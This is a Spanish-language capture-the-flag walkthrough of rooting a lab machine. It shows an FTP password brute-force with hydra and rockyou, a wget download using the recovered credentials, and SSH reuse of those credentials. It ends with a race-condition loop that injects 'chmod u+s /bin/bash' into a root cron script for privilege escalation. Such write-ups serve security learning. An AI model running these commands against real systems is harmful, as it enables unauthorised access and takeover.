Hacemos el escaneo de nmap:
![[Pasted image 20230805105624.png]]
Y esto es lo que corre por el puerto 80, donde se hace una mención al protocolo ftp y vemos un usuario llamado Juan:
![[Pasted image 20230805105655.png]]
Por lo que hacemos un ataque de fuerza bruta con hydra:
```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.60
```
![[Pasted image 20230805110031.png]]
Dentro del servidor ftp vemos muchos archivos:
![[Pasted image 20230805110452.png]]
Por lo que haremos una descarga recursiva de todos estos archivos con el comando wget de esta forma, poniendo la IP del servidor FTP:
```bash
wget -r ftp://"juan":"alexis"@192.168.0.60/
```
![[Pasted image 20230805111420.png]]
Si ejecutamos el comando tree veremos todos los archivos dentro de las carpetas, donde vemos un fichero de contraseña:
![[Pasted image 20230805111503.png]]
Pero es un rabbit hole:
![[Pasted image 20230805111529.png]]
De todos modos con el comando tree no estamos viendo los archivos ocultos, por lo que usaremos un tree -a .
```bash
tree -a .
```
Y ahora vemos un archivo oculto dentro de fold10:
![[Pasted image 20230805111929.png]]
Y nos dice algo de una cookie dentro del directorio personal del usuario:
![[Pasted image 20230805111954.png]]
De todos modos, dejando esta parte en pausa, si accedemos vía ssh con las credenciales de FTP vemos que estamos dentro:
![[Pasted image 20230805112407.png]]
Vemos 2 usuarios dentro de /home:
![[Pasted image 20230805112609.png]]
Pero lo interesante es si buscamos archivos con extensión .sh, donde vemos que hay uno muy interesante:
```bash
find / -name *.sh 2>/dev/null | xargs ls -l
```
![[Pasted image 20230805112915.png]]
Y si vemos el contenido del script sería este, donde vemos que se hace un curl a un archivo y luego se ejecuta con bash:
![[Pasted image 20230805113404.png]]
Nos da que pensar que este script se está ejecutando por detrás de forma automatizada, por lo que tenemos una utilidad llamada pspy para ver procesos que están corriendo:
![[Pasted image 20230805113713.png]]
Nos lo compartimos con curl porque wget no está instalado en la máquina víctima:
![[Pasted image 20230805113829.png]]
Y se empieza a ejecutar:
![[Pasted image 20230805114004.png]]
Y podemos confirmar que el script se ejecuta cada cierto tiempo:
![[Pasted image 20230805114102.png]]
La idea es poder crear un fichero llamado a.bash y hacer que el script lo ejecute antes de que llegue a eliminarlo:
![[Pasted image 20230805113404.png]]
Por tanto vamos a crear un bucle que constantemente esté creando el archivo con el código malicioso:
```bash
#!/bin/bash

while true; do
    echo 'chmod u+s /bin/bash' >> /tmp/a.bash && echo 'Funciona'
done
```
Si hacemos esto estaremos creando constantemente dicho archivo y si ejecutamos el script conseguiremos que se ejecute el código malicioso:
![[Pasted image 20230805115251.png]]
Y mientras este bucle se ejecuta, posiblemente se haya ejecutado de forma automatizada el script de chek_for_install.sh, por lo que detenemos el script y probamos en ejecutar un bash -p y ya somos root:
![[Pasted image 20230805115354.png]]
